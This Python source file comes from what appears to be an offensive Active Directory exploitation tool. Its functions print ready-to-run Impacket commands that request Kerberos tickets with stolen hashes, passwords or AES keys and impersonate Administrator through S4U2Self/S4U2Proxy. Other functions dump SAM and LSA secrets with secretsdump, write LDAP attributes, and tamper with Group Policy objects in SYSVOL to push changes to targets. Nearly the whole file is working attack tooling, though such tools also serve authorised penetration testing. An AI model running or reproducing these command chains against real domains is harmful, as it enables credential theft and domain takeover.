from colorama import Back, Fore, Style
from griffonad.lib.database import Owned, LDAPObject
import griffonad.lib.consts as c

def vars(glob:dict, parent:Owned, target:LDAPObject=None, **more_vars):
    v = {}
    if parent is not None:
        v.update({
            'parent': parent,
            'parent_no_dollar': parent.obj.name.replace('$', ''),
            'parent_ip': f'{Fore.RED}{parent.obj.name.replace("$","")}_IP{Style.RESET_ALL}',
        })
    if target is not None:
        v.update({
            'target': target,
            'target_no_dollar': target.name.replace('$', ''),
            'target_ip': f'{Fore.RED}{target.name.replace("$","")}_IP{Style.RESET_ALL}',
        })
    if parent is not None and target is not None:
        if parent.krb_need_fqdn:
            v['target_no_dollar'] += f".{glob['fqdn']}"
    v.update(glob)
    v.update(more_vars)
    return v

def print_line(comment, cmd, vars=None, end=True):
    print_comment(comment, vars, False)
    print_cmd(cmd, vars)
    if end:
        print()

def print_comment(comment, vars={}, end=True):
    if isinstance(comment, str):
        comment = [comment]
    for l in comment:
        print(f'{Fore.BLUE}# {l.format(**vars)}{Style.RESET_ALL}')
    if end:
        print()

def print_cmd(cmd, vars={}):
    if 'parent' in vars:
        orig_passwd = vars['parent'].secret
        vars['parent'].secret = f'{Fore.RED}{vars["parent"].secret}{Style.RESET_ALL}'
    if isinstance(cmd, str):
        cmd = [cmd]
    for l in cmd:
        print(l.format(**vars))
    if 'parent' in vars:
        vars['parent'].secret = orig_passwd

def print_warning(s):
    print(f'{Fore.RED}# WARNING: {s}{Style.RESET_ALL}')


def TGTRequest(glob:dict, parent:Owned, nopass=False):
    if parent.krb_auth:
        return

    v = vars(glob, parent)

    comment = 'Ask a TGT for {parent.obj.name}'

    if parent.secret_type == c.T_SECRET_AESKEY:
        cmd = "getTGT.py '{fqdn}/{parent.obj.name}' -dc-ip {dc_ip} -aesKey {parent.secret}"
    elif parent.secret_type == c.T_SECRET_NTHASH:
        cmd = "getTGT.py '{fqdn}/{parent.obj.name}' -dc-ip {dc_ip} -hashes :{parent.secret}"
    elif parent.secret_type == c.T_SECRET_PASSWORD:
        cmd = "getTGT.py '{fqdn}/{parent.obj.name}:{parent.secret}' -dc-ip {dc_ip}"
        if nopass:
            cmd += ' -no-pass'

    print_line(comment, cmd, v, end=False)
    print_cmd("export KRB5CCNAME='{parent.obj.name}.ccache'", v)
    print()
    parent.krb_auth = True


# Special function which modify the secret_type to AES
# The parent is the computer, if we have its ticket, hash or password
# we can retrieve/compute its AES Key.
def GetAESOnHost(glob:dict, parent:Owned):
    v = vars(glob, parent,
            plain=f'{Fore.RED}PLAIN_PASSWORD_OR_HEX{Style.RESET_ALL}')

    if parent.secret_type == c.T_SECRET_AESKEY:
        return

    if parent.secret_type == c.T_SECRET_PASSWORD:
        comment = 'Get the AES key from the password for more convenience'
        cmd = "./tools/aesKrbKeyGen.py '{fqdn}/{parent.obj.name}:{plain}'"
        print_line(comment, cmd, v)
        parent.secret = f'{parent.obj.name.upper().replace("$","")}_AESKEY'
        parent.secret_type = c.T_SECRET_AESKEY
        return

    if parent.krb_auth:
        cmd = "getST.py '{fqdn}/{parent.obj.name}' -self -impersonate Administrator -altservice HOST/{parent_no_dollar} -k -no-pass -dc-ip {dc_ip}"
    elif parent.secret_type == c.T_SECRET_NTHASH:
        cmd = "getST.py '{fqdn}/{parent.obj.name}' -self -impersonate Administrator -altservice HOST/{parent_no_dollar} -hashes :{parent.secret} -dc-ip {dc_ip}"

    comment = "Retrieve the AES KEY on {parent.obj.name}"
    print_line(comment, cmd, v, end=False)

    if parent.krb_auth:
        print_cmd('copy="$KRB5CCNAME"')

    print_cmd("export KRB5CCNAME='Administrator@HOST_{parent_no_dollar}@{fqdn}.ccache'", v)
    print()

    comment = "Dump the SAM and LSA cache on {parent.obj.name} and get the AES key"
    cmd = "secretsdump.py '{parent_no_dollar}' -k -no-pass -dc-ip {dc_ip} -target-ip '{parent_ip}'"
    print_line(comment, cmd, v, end=False)

    if parent.krb_auth:
        print_cmd('export KRB5CCNAME="$copy"')

    print()

    comment = "Get the AES key from the password"
    cmd = "./tools/aesKrbKeyGen.py '{fqdn}/{parent.obj.name}:{plain}'"
    print_line(comment, cmd, v)

    parent.secret = f'{parent.obj.name.upper().replace("$","")}_AESKEY'
    parent.secret_type = c.T_SECRET_AESKEY


def GetSTImpersonate(glob:dict, parent:Owned, requested_spn:str,
                     do_u2u:bool, do_additional:str=''):
    v = vars(glob, parent,
        do_u2u= ' -u2u' if do_u2u else '',
        do_additional=do_additional,
        requested_spn=requested_spn)

    comment = 'Ask a TGS for {requested_spn} and impersonate it to Administrator (S4U2Self + S4U2Proxy)'

    if parent.krb_auth:
        cmd = "getST.py '{fqdn}/{parent.obj.name}' -k -no-pass -dc-ip {dc_ip} -impersonate Administrator -spn '{requested_spn}'{do_u2u}{do_additional}"
    elif parent.secret_type == c.T_SECRET_NTHASH:
        cmd = "getST.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -dc-ip {dc_ip} -impersonate Administrator -spn '{requested_spn}'{do_u2u}{do_additional}"
    elif parent.secret_type == c.T_SECRET_AESKEY:
        cmd = "getST.py '{fqdn}/{parent.obj.name}' -no-pass -aesKey {parent.secret} -dc-ip {dc_ip} -impersonate Administrator -spn '{requested_spn}'{do_u2u}{do_additional}"
    elif parent.secret_type == c.T_SECRET_PASSWORD:
        cmd = "getST.py '{fqdn}/{parent.obj.name}:{parent.secret}' -dc-ip {dc_ip} -impersonate Administrator -spn '{requested_spn}'{do_u2u}{do_additional}"

    print_line(comment, cmd, v, end=False)

    v['requested_spn'] = v['requested_spn'].replace('/', '_')
    print_cmd("export KRB5CCNAME='Administrator@{requested_spn}@{fqdn}.ccache'", v)
    print()

    parent.krb_auth = True


# View or modify a ldap attribute
def Attr(glob:dict, parent:Owned, target_name:LDAPObject,
         key:str, write_value:str=None, add_value:str=None, save_in_var:str=None):
    v = vars(glob, parent, target_name=target_name, key=key)

    if parent.krb_auth:
        cmd = "./tools/attr.py '{fqdn}/{parent.obj.name}@{dc_name}' -use-ldaps -dc-ip {dc_ip} -k -t '{target_name}' -key {key}"
    elif parent.secret_type == c.T_SECRET_NTHASH:
        cmd = "./tools/attr.py '{fqdn}/{parent.obj.name}@{dc_ip}' -use-ldaps -hashes :{parent.secret} -t '{target_name}' -key {key}"
    elif parent.secret_type == c.T_SECRET_AESKEY:
        cmd = "./tools/attr.py '{fqdn}/{parent.obj.name}@{dc_ip}' -use-ldaps -k -aesKey {parent.secret} -t '{target_name}' -key {key}"
    elif parent.secret_type == c.T_SECRET_PASSWORD:
        cmd = "./tools/attr.py '{fqdn}/{parent.obj.name}:{parent.secret}@{dc_ip}' -use-ldaps -t '{target_name}' -key {key}"

    if write_value is not None:
        write_value = write_value.replace('}', '}}').replace('{', '{{')
        cmd = cmd + f' -w \"{write_value}\"'
    elif add_value is not None:
        add_value = add_value.replace('}', '}}').replace('{', '{{')
        cmd = cmd + f' -add \"{add_value}\"'
    elif save_in_var is not None:
        cmd = f'{save_in_var}=`{cmd} | tail -n 1`'

    print_cmd(cmd, v)


def pre_update_gpo(glob:dict, parent:Owned, target:LDAPObject, gpo:LDAPObject):
    if target.type == c.T_COMPUTER:
        attr_extname = 'gPCMachineExtensionNames'
        inc = '1'
    elif target.type == c.T_USER:
        attr_extname = 'gPCUserExtensionNames'
        inc = '65536'

    print_comment('Get values', end=False)

    Attr(glob, parent, gpo.gpo_dirname_id,
        key=attr_extname,
        save_in_var='en')

    Attr(glob, parent, gpo.gpo_dirname_id,
        key='versionNumber',
        save_in_var='vn')

    print()
    print('echo $en')
    print('echo $vn')
    print(f"vn=$(($vn + {inc}))")
    print('echo $vn')
    print()

    comment = 'Browse SYSVOL'

    if parent.krb_auth:
        cmd = "smbclient.py '{fqdn}/{parent.obj.name}'@{dc_name} -dc-ip {dc_ip} -k -no-pass"
    elif parent.secret_type == c.T_SECRET_NTHASH:
        cmd = "smbclient.py '{fqdn}/{parent.obj.name}'@{dc_name} -dc-ip {dc_ip} -hashes :{parent.secret}"
    elif parent.secret_type == c.T_SECRET_AESKEY:
        cmd = "smbclient.py '{fqdn}/{parent.obj.name}'@{dc_name} -dc-ip {dc_ip} -k -aesKey {parent.secret}"
    elif parent.secret_type == c.T_SECRET_PASSWORD:
        cmd = "smbclient.py '{fqdn}/{parent.obj.name}:{parent.secret}'@{dc_name} -dc-ip {dc_ip}"

    print_line(comment, cmd, glob, end=False)

    print_cmd([
        'use SYSVOL',
        'cd /{fqdn_lower}/Policies/{gpo.gpo_dirname_id}/',
        'get GPT.INI',
        'CTRL-Z # pause the smbclient',
        'sed -i "s/^Version=[0-9]*/Version=$vn/g" GPT.INI',
        'fg',
        'put GPT.INI',
    ], glob)
    print()


def post_update_gpo(glob:dict, parent:Owned, target:LDAPObject, gpo:LDAPObject, extnames:str):
    if target.type == c.T_COMPUTER:
        attr_extname = 'gPCMachineExtensionNames'
    elif target.type == c.T_USER:
        attr_extname = 'gPCUserExtensionNames'

    print_comment('Update values', end=False)

    Attr(glob, parent, gpo.gpo_dirname_id,
        key=attr_extname,
        write_value=f"`./tools/mergeGUID.py \"$en\" '{extnames}'`")

    Attr(glob, parent, gpo.gpo_dirname_id,
        key='versionNumber',
        write_value=f"$vn")

    print()

    if target.type == c.T_USER:
        print_comment('Wait {target.name} logon...', glob)
        return

    comment = [
        'Wait max 90 min for gpo propagation... (or gpudate /force on the target for testing)',
        'You can check the report on the target with: GPRESULT /H GPReport.html'
    ]
    print_comment(comment)
